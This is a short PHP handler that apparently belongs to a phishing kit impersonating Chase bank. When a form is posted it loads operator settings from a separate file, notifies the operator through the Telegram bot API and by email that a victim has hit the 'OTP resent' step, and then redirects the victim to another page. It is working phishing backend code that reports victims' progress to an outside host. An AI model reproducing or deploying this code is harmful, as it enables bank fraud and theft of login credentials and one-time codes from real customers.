<?php
if(isset($_POST['action'])){
  include 'to.php';
    $message = "---------= Chase OTP Rrsent =---------\n";
$subject = "Chase LOGIN";
$headers = "From: Mody@BOA".rand(1,99)."Mody.V1 \r\n" ;


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode("hi")."" );
 $done = mail($toemail, $subject, $message, $headers);
	header('Location: ./red.php');
}


?>